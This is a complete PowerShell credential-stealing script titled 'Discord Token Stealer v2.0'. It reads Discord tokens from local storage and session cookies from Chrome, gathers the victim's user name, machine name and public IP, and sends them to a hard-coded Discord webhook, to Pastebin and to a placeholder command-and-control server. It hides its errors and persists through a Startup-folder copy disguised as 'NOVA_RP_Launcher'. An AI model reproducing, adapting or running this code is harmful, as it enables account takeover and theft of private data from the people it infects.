# Discord Token Stealer v2.0
$ErrorActionPreference = "SilentlyContinue"
$Webhook = "https://discord.com/api/webhooks/1549675006970306560/ZizSzCiwDIKRmokuHx8lIUhud9csD0X_iZbzngCHdo50FgGO6-9ySegVN5bXDlqdfr7b"

function Get-DiscordTokens {
    $tokens = @()
    $paths = @(
        "$env:APPDATA\discord\Local Storage\https://discord.com",
        "$env:LOCALAPPDATA\discord\Local Storage\https://discord.com",
        "$env:APPDATA\discordptb\Local Storage\https://discord.com",
        "$env:LOCALAPPDATA\discordptb\Local Storage\https://discord.com",
        "$env:APPDATA\discord-canary\Local Storage\https://discord.com",
        "$env:LOCALAPPDATA\discord-canary\Local Storage\https://discord.com"
    )
    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                $files = Get-ChildItem -Path $path -Recurse -File
                foreach ($file in $files) {
                    $content = Get-Content $file.FullName -Raw
                    if ($content -match '"token"\s*:\s*"([A-Za-z0-9_-]{50,})"') {
                        $tokens += [PSCustomObject]@{
                            Token = $matches[1]
                            Path = $file.FullName
                            Discord = (Split-Path (Split-Path $file.FullName -Parent) -Leaf)
                        }
                    }
                }
            } catch {}
        }
    }

    $chromeCookies = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
    if (Test-Path $chromeCookies) {
        try {
            $cookieContent = Get-Content $chromeCookies -Raw
            if ($cookieContent -match '__session=[A-Za-z0-9_-]+') {
                $tokens += [PSCustomObject]@{
                    Token = $matches[0]
                    Path = $chromeCookies
                    Discord = "Chrome_Cookie"
                }
            }
        } catch {}
    }
    return $tokens
}

function Exfiltrate-Tokens {
    param([Array]$tokens)
    if ($tokens.Count -eq 0) { return }
    $output = "=== Discord Token Stealer Results ===`n"
    $output += "System: $env:COMPUTERNAME`n"
    $output += "User: $env:USERNAME`n"
    $output += "IP: $(Invoke-RestMethod -Uri 'http://ifconfig.me' -ErrorAction SilentlyContinue)`n"
    $output += "=====================================`n`n"
    foreach ($token in $tokens) {
        $output += "Token: $($token.Token)`n"
        $output += "Discord: $($token.Discord)`n"
        $output += "Path: $($token.Path)`n"
        $output += "---`n"
    }

    try {
        $body = @{
            username = "Discord Logs"
            embeds = @(
                @{
                    title = "🎯 New Victim"
                    color = 15158332
                    fields = @(
                        @{ name = "User"; value = $env:USERNAME; inline = $true },
                        @{ name = "PC"; value = $env:COMPUTERNAME; inline = $true },
                        @{ name = "Tokens"; value = $tokens.Count; inline = $true },
                        @{ name = "Tokens"; value = ($tokens.Token -join "`n"); inline = $false }
                    )
                    footer = @{ text = "Token Stealer v2.0" }
                }
            )
        } | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json"
    } catch {}

    try {
        $PastebinAPI = "https://pastebin.com/api/api_post.php"
        $PastebinKey = "YOUR_PASTEBIN_DEV_KEY"
        $pasteBody = "api_option=paste&api_paste_code=$([System.Uri]::EscapeDataString($output))&api_paste_name=discord_tokens_$env:USERNAME&api_paste_format=powershell&api_paste_expire=1D&api_dev_key=$PastebinKey"
        Invoke-RestMethod -Uri $PastebinAPI -Method Post -Body $pasteBody
    } catch {}

    try {
        Invoke-RestMethod -Uri "https://YOUR-C2-SERVER.com/collect" -Method Post -Body $output
    } catch {}

    Remove-Variable tokens -ErrorAction SilentlyContinue
    [GC]::Collect()
}

$foundTokens = Get-DiscordTokens
Exfiltrate-Tokens -tokens $foundTokens

# Persistence - NOVA_RP_Launcher
$persistPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\NOVA_RP_Launcher.ps1"
if (!(Test-Path $persistPath)) {
    Copy-Item $MyInvocation.MyCommand.Path $persistPath -ErrorAction SilentlyContinue
}

Clear-Host